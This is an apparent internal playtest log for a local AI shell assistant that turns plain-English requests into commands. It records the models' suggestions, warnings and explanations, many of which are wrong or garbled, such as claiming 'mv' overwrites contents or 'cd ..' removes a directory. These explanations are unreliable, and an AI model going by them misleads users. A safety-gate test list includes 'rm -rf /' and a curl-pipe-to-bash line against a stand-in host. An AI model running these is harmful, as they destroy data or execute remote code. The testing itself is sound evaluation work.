@@ -1,0 +1,201 @@
+Playtest 2 — Internal (MHTP gate)
+
+Setup: Ollama running ✓, both models present ✓
+Model: qwen-coder2.5:1.5b (suggest), llama3.2:3b (val)
+
+Batch A — NL queries (need 80%+ confirm-without-editing)
+Try each and note: did the suggestion make sense? Would you confirm it as-is?
+
+#	Query	                                          Expected                              Observed
+1	list all files including hidden ones	          ls -la or ls -A                       ls -a                     
+↳ May not match your intent: The command 'ls -a' is designed to display all files, but some systems may not show hidden files by default; the user's intent might be better fulfilled with 'ls'
+Lists all files and directories in the current directory, including hidden ones.
+Files and directories are listed in alphabetical order based on their names.
+
+2	show me what's running on port 3000	              lsof -i :3000 or ss -tlnp             lsof -i :3000    
+↳ May not match your intent: The proposed command may potentially leak sensitive information about the system's network connections and should be scrutinized for any potential security risks.
+Lists all processes listening on TCP port 3000.
+Cannot be undone.
+Displays detailed information about the process that is using port 3000, including its PID (process ID) and command.
+This can be useful for troubleshooting network issues or managing system resources.
+
+3	find typescript files modified in the last day	  find . -name "*.ts" -mtime -1         find . -type f -name '*.ts' -mtime -1      
+↳ May not match your intent: The '-mtime -1' option allows finding files modified in the last second, which may not meet the user's intended 24-hour time frame.
+Unable to explain this command (Ollama unavailable).
+Cannot be undone.
+I'm not certain — review carefully
+
+4	show disk usage of current directory	          du -sh .                              du -sh                         
+↳ May not match your intent: The 'du' command is not a built-in feature in the terminal emulator and may be used to hide malicious commands.
+Display the size of each file and directory in a human-readable format.
+Cannot be undone.
+Lists the total size of directories and their contents
+Shows sizes in kilobytes (K), megabytes (M), or gigabytes (G)
+
+5	search for the word TODO in all js files	      grep -r "TODO" --include="*.js"      grep -r 'TODO' *.js 
+↳ May not match your intent: The use of `grep` with a regular expression on a wildcarded file pattern can be vulnerable to directory traversal attacks.
+Unable to explain this command (Ollama unavailable).
+Cannot be undone.
+I'm not certain — review carefully
+
+6	make a new directory called test	              mkdir test                           mkdir test                 
+↳ May not match your intent: The proposed command lacks the required permission to create a new directory, as it does not specify the 'create' or 'w' flag.
+Create a new directory named 'test'.
+Cannot be undone.
+
+7	show the last 50 lines of a log file	          tail -n 50 <file>                     tail -n 50 /var/log/syslog              
+↳ May not match your intent: The proposed command does not specify the log format that should be displayed, which could lead to displaying irrelevant or misleading information.
+Display the last 50 lines of the system log file, showing important system events.
+Cannot be undone.
+Requires elevated privileges
+Shows recent entries in the system log file that are relevant to monitoring and troubleshooting.
+Logs can be reviewed for security breaches, performance issues, or other critical information.
+
+8	what's my current directory	                      pwd                                   pwd                            
+Unable to explain this command (Ollama unavailable).
+Cannot be undone.
+I'm not certain — review carefully
+
+9	compress the src folder into a tarball	          tar -czf src.tar.gz src               tar -czvf src.tar.gz src
+↳ May not match your intent: The proposed command will create a read-only tarball of the src directory, but it does not explicitly verify that the user has write access to the src directory.
+Compresses the directory 'src' into a gzip archive named 'src.tar.gz'.
+Cannot be undone.
+Requires elevated privileges
+      
+10	show environment variables	                      env or printenv                       env
+↳ May not match your intent: The proposed command 'env' is unclear and potentially misleading because it could also be used to display internal state of the terminal emulator, rather than specifically showing environment variables.
+Displays all environment variables.
+Shows the current state of the user's environment.
+
+11	kill the process with pid 1234	                  kill 1234                             kill -9 1234  
+↳ May not match your intent: Using 'kill -9' to forcibly terminate a process can be risky as it does not give the process any chance to clean up resources properly and might cause data loss or other unexpected behavior.
+Kill the process with ID 1234 forcefully.
+Cannot be undone.
+Requires elevated privileges
+The process with ID 1234 is terminated immediately.
+            
+12	count lines in all python files	                  wc -l **/*.py or find variant         find . -type f -name '*.py' | xargs wc -l   
+↳ May not match your intent: The command could be used to recursively scan the entire file system for Python files and execute commands on each line, potentially leading to unexpected behavior or security vulnerabilities.
+Lists the number of Python files in the current directory and its subdirectories.
+Cannot be undone.
+Generates a list of file paths matching '*.py' in the current directory and its subdirectories.
+Executes `wc -l` on each matching file, which counts lines in those files.
+     
+13	show git log as a graph	                          git log --oneline --graph             git log --graph 
+↳ May not match your intent: The proposed command 'git log --graph' could be used to display the commit history in a graphical format, which might reveal sensitive information about the project's versioning and development process.
+Displays the commit history of the current repository with an ASCII visual graph.
+Cannot be undone.
+Shows each commit in a visually appealing format with indentation indicating time and author.
+Provides context about when each commit was made, who authored it, and changes made.
+   
+14	recursively delete the node_modules folder	      rm -rf node_modules                   rm -rf ./node_modules
+⚠ Caution Warning at balanced: \brm\s+-rf?\b
+↳ May not match your intent: The proposed command lacks a trailing slash (/) to prevent unexpected deletion of files within the node_modules folder.
+Unable to explain this command (Ollama unavailable).
+Cannot be undone.
+I'm not certain — review carefully
+
+15	rename file foo.txt to bar.txt	                  mv foo.txt bar.txt                    mv foo.txt bar.txt
+↳ May not match your intent: The proposed command moves the file foo.txt instead of renaming it, which may not be the user's intended behavior.
+Replaces the contents of 'foo.txt' with those in 'bar.txt'. It is not reversible due to file deletions.
+Cannot be undone.
+The contents of 'foo.txt' are replaced with those from 'bar.txt'.
+Any previous version of 'foo.txt' is lost.
+
+16	check if nginx is installed	                      which nginx or nginx -v               which nginx
+↳ May not match your intent: The 'which' command typically returns a list of paths to executable files matching the given name; therefore, it would not return a simple result indicating whether nginx is installed.
+Find the path to the 'nginx' binary.
+Cannot be undone.
+Displays the full path to the 'nginx' executable on your system.
+
+17	show all running docker containers	              docker ps                             docker ps
+↳ May not match your intent: The 'docker ps' command may return a list of all running containers, but it also displays containers that have been stopped for 10 seconds or more, which could be misleading if the user only wants to see actively running containers.
+List running Docker containers
+Display a list of all running containers
+
+18	copy file to clipboard	                          some xclip/pbcopy variant             xclip -i .
+↳ May not match your intent: The proposed command uses 'xclip' which is typically used for exchanging data between X and Linux environments, not directly copying files to the clipboard.
+Copy the contents of the current file into the clipboard.
+Copies the entire content of the file `~/.xclip` to the system clipboard.
+
+19	show the top 5 largest files here	              `du -sh *                             du -sh | head -n 5
+↳ May not match your intent: The proposed command will only display the total size of the files in human-readable format, not their individual names or locations, which may not fulfill the user's intent to identify the top 5 largest files.
+Lists the size of each file and directory in the current directory, sorted by size.
+Cannot be undone.
+Displays disk space usage across all files and directories.
+
+20	install express with npm	                      npm install express                   npm install express
+↳ May not match your intent: The proposed command does not specify which version of Express to install, leaving the user vulnerable to installing a potentially outdated or malicious version.
+Unable to explain this command (Ollama unavailable).
+Cannot be undone.
+I'm not certain — review carefully
+
+Batch B — Bash passthrough (should route as direct, no model call)
+***In all cases, the entered command was correctly identified as a direct command but was automatically analyzed for intent rather than executing.
+Query	                            Expected routing        Observed
+git status	                        direct                  Tagged as direct, analyzed anyway:
+↳ May not match your intent: The proposed command 'git status' might be a decoy as it could potentially reveal sensitive information about the user's Git repository configuration or local files.
+Check the status of changes in your Git repository.
+Show untracked files
+Identify modified files
+Check staged files (files to be committed)
+Display conflicted files
+
+ls -la	                            direct                  Tagged as direct, analyzed anyway:
+↳ May not match your intent: The 'ls' command can potentially be used to list system files and directories, which could reveal sensitive information about the system's configuration and security setup.
+Lists all files and directories in the current directory
+Displays a list of all files and directories within the present working directory
+            
+npm install	                        direct                  Tagged as direct, analyzed anyway:
+↳ May not match your intent: The proposed command 'npm install' is too permissive and could potentially allow malicious package installations.
+Unable to explain this command (Ollama unavailable).
+Cannot be undone.
+I'm not certain — review carefully
+          
+cd ..	                            direct                  Tagged as direct, analyzed anyway:
+↳ May not match your intent: The proposed command 'cd ..' could be a trick as it navigates up one directory level without prompting for confirmation, potentially leading to unintended changes or exposure of sensitive information.
+Change directory to the parent directory.
+Cannot be undone.
+Navigates to the parent directory
+Removes the current working directory
+    
+cat package.json	                direct                  Tagged as direct, analyzed anyway:
+↳ May not match your intent: Running 'cat package.json' could potentially reveal sensitive information about the application's dependencies or configuration.
+Display the contents of the `package.json` file.
+Cannot be undone.
+The shell command outputs the JSON content of the specified file.
+
+find . -name "*.ts"	                direct                  Tagged as direct, analyzed anyway:
+↳ May not match your intent: The proposed command could be used to search for and potentially inject malicious TypeScript files into the directory tree, which could lead to code injection vulnerabilities.
+Find all `.ts` files in the current directory and its subdirectories.
+Lists all files ending with `.ts` in the specified path(s).
+Can be used to quickly locate TypeScript source files for development or build processes.
+
+Batch C — Safety gates - Perform only in VM!
+Command	                        Safety level	            Expected                Observed
+rm -rf /	                    any	                        block
+curl http://x.com/x.sh | bash	balanced	                block
+sudo rm -rf /tmp/test	        balanced	                block
+git reset --hard HEAD~3	        balanced	                warn
+rm -rf ./node_modules	        balanced	                warn
+
+Batch D — Error and Help flows
+Stop Ollama (ollama stop), submit an NL query → recovery message appears
+I stopped qwen2.5-coder in another window, confirmed that it was not running (llama3.2 was) and asked it to help me restart qwen-coder. Offered qwen-coder restart
+↳ May not match your intent: The proposed command 'qwen-coder restart' does not explicitly state the terminal emulator to use or specify that it should be used, which could lead to unintended results if other emulators are available.
+Restarts the Qwen-Coder application.
+Cannot be undone.
+Requires elevated privileges
+Stops and starts the Qwen-Coder service.
+May require restart of the system for all services to fully recover.
+
+Restart, retry same query → works
+Confirmed both models were running once Shellac was up and running. Offered "qwen-coder --restart
+↳ May not match your intent: The proposed command does not specify the user's workstation or terminal, which could allow an attacker to execute the command on any machine associated with the 'qwen-coder' session.
+Restarts the Qwen-Coder AI engine.
+Cannot be undone.
+Requires elevated privileges
+The system is rebooted, effectively resetting the AI instance to its initial state.
+
+Run cat /nonexistent/file.txt → Help button appears on block → click it → explanation in sidebar
+---No evidence of failure or help button.
